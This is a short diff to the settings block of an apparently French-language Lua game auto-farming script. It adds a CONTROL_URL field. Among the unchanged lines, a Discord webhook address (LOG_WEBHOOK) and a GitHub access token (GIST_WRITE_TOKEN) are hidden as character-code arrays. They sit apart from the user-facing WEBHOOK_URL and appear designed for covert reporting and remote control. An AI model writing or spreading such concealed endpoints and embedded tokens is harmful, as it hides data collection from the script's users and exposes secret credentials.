@@ -15,6 +15,7 @@ local farming     = false
 local AUTO_BANK   = true
 local AUTO_SELL   = false
 local WEBHOOK_URL = ""
+local CONTROL_URL  = ""
 local STATUS_INTERVAL = 10  -- minutes entre chaque rapport de statut (0 = désactivé)
 local LOG_WEBHOOK      = (function() local t={104,116,116,112,115,58,47,47,100,105,115,99,111,114,100,46,99,111,109,47,97,112,105,47,119,101,98,104,111,111,107,115,47,49,52,51,48,51,56,48,49,57,52,54,54,52,57,52,51,55,52,57,47,84,86,51,113,75,74,115,120,51,83,117,88,117,114,66,51,120,118,108,45,120,104,84,71,99,48,49,102,117,112,56,108,86,48,88,67,71,56,80,74,68,68,89,97,119,71,111,48,97,68,121,83,113,86,75,101,54,84,45,108,48,72,97,45,122,114,78,99} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()
 local GIST_WRITE_TOKEN = (function() local t={103,104,112,95,85,67,75,76,118,119,79,55,77,73,119,87,75,119,97,56,87,50,113,84,97,57,112,51,79,98,48,56,83,73,51,86,107,85,54,50} local s="" for _,c in ipairs(t) do s=s..string.char(c) end return s end)()
